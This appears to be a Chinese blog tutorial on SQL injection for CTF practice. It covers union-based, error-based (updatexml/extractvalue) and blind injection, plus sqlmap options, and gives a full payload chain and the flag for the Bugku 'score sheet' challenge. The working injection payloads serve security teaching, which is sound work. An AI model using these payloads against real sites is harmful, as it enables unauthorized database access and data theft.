---
title: SQL注入入门
date: 2019-07-25 09:40:09
tags:
- SQL
- web
categories: CTF
mathjax: true
---

![1562999206468](1562999206468.png)



#### 判断有无引号

- 根据字段的意义或输入的值
  - Name/可以输入字母或符号
  - Id/输入是数字
- 运算测试id=2-1
  - 结果与id=1一样，说明2-1被执行，没有被引号包裹
  - 结果与id=2一样，说明2-1被当做字符串先进行了类型转换，再执行，有引号



#### 判断单双引号

- 一般来说可以直接用转义字符进行判断

  ![1562999570039](1562999570039.png)



  ![1562999587796](1562999587796.png)

  ps:上面这个bugku上的成绩单一题是利用post进行传值

  这里的后台就可以认为是单引号

```mysql
  Select * from table1 where id = ‘$id’
```



#### Union进行注入

- 将两个或多个查询的结果合并到一个结果集中。
- 所有查询中的列数和列的顺序必须相同。数据类型必须兼容。



##### 确定列数

- 方法一：union select 1,2,3…，尝试到报错之前的那个数就是列数
- 方法二：order by 1..…，也是尝试到报错之前的那个数就是列数



##### 确定显示字段

```txt
//mysql中一些基础知识
1. -- 与后面的这个单引号连接在一起，无法形成有效的mysql语句
2. --+ 加号与上面的区别就是多了一个空格符，-- -也有一样的效果
3. # 会注释掉后面的语句	
```



##### information_schema

这个数据库存放的是数据库和数据表的元信息

- 看数据库

  ```mysql
  select schema_name from information_schema.schemata;
  ```

- 看表名

  ```mysql
  select table_name from information_schema.tables;
  ```

- 看列名

  ```mysql
  select column_name from information_schema.columns;
  ```

- ```mysql
  #格式
  select group_concat(column_name) from information_schema.columns where table_name=‘xxx’/0x…;
  ```



##### 根据已知信息查数据

- `Select group_concat(列名) from 数据库名.表名;`





#### Sqlmap

- -–dbs 枚举数据库管理系统数据库
- -–tables 枚举的 DBMS 数据库中的表   -T 指定
- -–columns 枚举 DBMS 数据库表列  -C 指定
- -–dump 转储数据库管理系统的数据库中的表项



#### 报错注入 

##### updatexml

- UPDATEXML (XML_document, XPath_string, new_value); 
- 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc；
- 第二个参数：XPath_string (`Xpath`格式的字符串)。
- 第三个参数：new_value，是String格式，替换查找到的符合条件的数据。
- 利用的关键是，`updatexml`第二个参数需要的是`Xpath`格式的字符串。如果输入的不符合`Xpath`格式，将会发生错误。



##### extractvalue

- `extractvalue`函数与`updatexml`函数基本相同 ，区别在于`extractvalue`仅有两个参数。
- EXTRACTVALUE (XML_document, XPath_string); 
- 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 。
- 第二个参数：XPath_string (`Xpath`格式的字符串)。
- 同样的，`extractvalue`第二个参数需要的是`Xpath`格式的字符串。如果输入的不符合`Xpath`格式，将会发生错误。
- `32.php?id=1 and extractvalue(1,concat(0x7e,(select USER()),0x7e))`



#### 练手题：bugku 成绩单

![1563002860330](1563002860330.png)

```mysql
#构造过程
id=-1' union select 1,2,3,4#  //爆出字段，发现四个都有回显
id=-1'union select 1,2,3,database()#  //得到数据库的名字skctf_flag
id=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#  //获取表名fl4g,sc
id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='fl4g'#  //获取行名skctf_flag
id=-1' union select 1,2,3,skctf_flag from fl4g# //读取字段类容
```

`BUGKU{Sql_INJECT0N_4813drd8hz4}`





#### 盲注

- 页面不会返回查询结果
- 页面状态只有两种，真/假

##### 基于布尔的盲注攻击

- 攻击者在参数中输入类似“用户名第一个字母是a么”这样的SQL语句，根据页面结果判断真假。如果为真，继续暴力破解第二个字母。如果为假，则更改条件，“用户名第一个字母是b么”，以此类推进行基于布尔的盲注攻击。
- `SUBSTRING(str,pos,len)`，分别代表了被截取字符串、开始截取位置、截取长度。如果没有定义`len`，则截取至`str`末尾。`pos`可以为负值，意思为倒数第几位。

###### 确定长度

`?id=1 and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())<4`

###### 确定具体内容

`?id=1 and (select substring(group_concat(table_name),1,1) from information_schema.tables where table_schema=database())=‘a’`



##### 基于时间的盲注

- Sleep(5)
- benchmark(10000000,MD5(1))

